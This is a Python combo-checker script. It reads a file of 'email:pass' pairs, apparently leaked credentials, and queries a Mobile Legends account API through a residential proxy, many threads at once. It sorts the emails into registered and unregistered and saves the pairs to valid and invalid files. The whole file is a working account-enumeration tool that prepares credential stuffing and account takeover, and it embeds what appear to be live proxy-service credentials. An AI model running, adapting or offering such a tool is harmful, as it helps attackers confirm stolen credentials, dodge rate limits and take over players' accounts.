import requests
import threading
import os
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.progress import Progress

console = Console()

username = "geonode_Qwd0kINewa-type-residential"
password = "bf3324c8-72be-4e7b-a140-9adbcac03b1e"
proxy_host = "92.204.164.15:9000"
proxy_url = f"http://{username}:{password}@{proxy_host}"

api_url = "https://sg-api.mobilelegends.com/base/sendEmail"

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/x-www-form-urlencoded'
}

input_file = console.input("[bold yellow]Enter path to combo file (email:pass format): [/bold yellow]").strip()
output_file = console.input("[bold green]Enter output file path: [/bold green]").strip()
thread_count = int(console.input("[bold cyan]Enter number of threads (higher = faster): [/bold cyan]").strip())

valid_file = f"{output_file}_valid.txt"
invalid_file = f"{output_file}_invalid.txt"
lock = threading.Lock()

if not os.path.exists(input_file):
    console.print("[bold red]File not found. Please check the path.[/bold red]")
    exit()

with open(input_file, "r") as file:
    combos = [line.strip() for line in file.readlines() if ":" in line]

def check_email(combo):
    email, password = combo.split(":", 1)
    data = {
        'account': email,
        'module': 'mpass',
        'type': 'web',
        'app_id': '668'
    }
    proxies = {"http": proxy_url, "https": proxy_url}
    try:
        response = requests.post(api_url, data=data, headers=headers, proxies=proxies, timeout=5)
        response_json = response.json()
        if response_json.get('msg') == 'Error_EmailAlreadyUsed':
            console.print(f"[bold green]〘✔ VALID〙: {email}:{password}[/bold green]")
            with lock:
                with open(valid_file, "a") as vf:
                    vf.write(f"{email}:{password}\n")
        else:
            console.print(f"[bold red]〘✘ INVALID〙: {email}:{password}[/bold red]")
            with lock:
                with open(invalid_file, "a") as ivf:
                    ivf.write(f"{email}:{password}\n")
    except requests.RequestException as e:
        console.print(f"[bold yellow]〘‼︎ ERROR〙: {email}:{password} - {str(e)}[/bold yellow]")

console.print("[bold cyan]Starting email validation...[/bold cyan]")
with Progress(console=console) as progress:
    task = progress.add_task("[cyan]Checking emails...", total=len(combos))
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in executor.map(check_email, combos):
            progress.update(task, advance=1)

console.print("[bold magenta]━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold magenta]")
console.print(f"[bold green]【VALID EMAILS】: {sum(1 for _ in open(valid_file))}[/bold green]")
console.print(f"[bold red]【INVALID EMAILS】: {sum(1 for _ in open(invalid_file))}[/bold red]")
console.print(f"[bold blue]【TOTAL CHECKED】: {len(combos)}[/bold blue]")
console.print(f"[bold cyan]【OUTPUT FILE】: {output_file}[/bold cyan]")
console.print("[bold magenta]━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold magenta]")
